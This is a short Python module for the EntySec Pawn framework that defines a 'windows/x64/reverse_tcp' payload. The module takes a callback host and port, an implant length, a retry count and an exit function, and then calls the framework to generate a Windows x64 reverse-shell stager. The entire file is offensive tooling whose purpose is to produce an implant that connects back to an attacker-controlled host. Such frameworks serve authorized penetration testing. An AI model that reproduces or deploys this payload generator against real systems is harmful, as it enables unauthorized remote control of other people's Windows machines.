"""
This module requires Pawn: https://github.com/EntySec/Pawn
Current source: https://github.com/EntySec/Pawn
"""

from pawn.lib.module import *
from pawn.lib.windows import Windows


class PawnModule(Module, Windows):
    def __init__(self):
        super().__init__()

        self.details.update({
            'Name': "windows/x64/reverse_tcp",
            'Authors': [
                'Ivan Nikolskiy (enty8080) - payload developer'
            ],
            'Arch': ARCH_X64,
            'Platform': OS_WINDOWS,
            'Type': "reverse_tcp",
        })

        self.host = IPv4Option(None, 'Host to connect to.', True)
        self.port = PortOption(None, 'Port to connect to.', True)

        self.length = IntegerOption(None, 'Length of the implant.', True)
        self.retries = IntegerOption(1, 'Number of retries.', True)

        self.reliable = BooleanOption('yes', 'Make payload reliable.', True)
        self.exit = Option('thread', 'Exit function.', True)

    def run(self):
        return self.get_payload(
            arch=self.details['Arch'],
            type=self.details['Type'],
            host=self.host.value,
            port=self.port.value,
            length=self.length.value,
            retries=self.retries.value,
            exit=self.exit.value,
        )
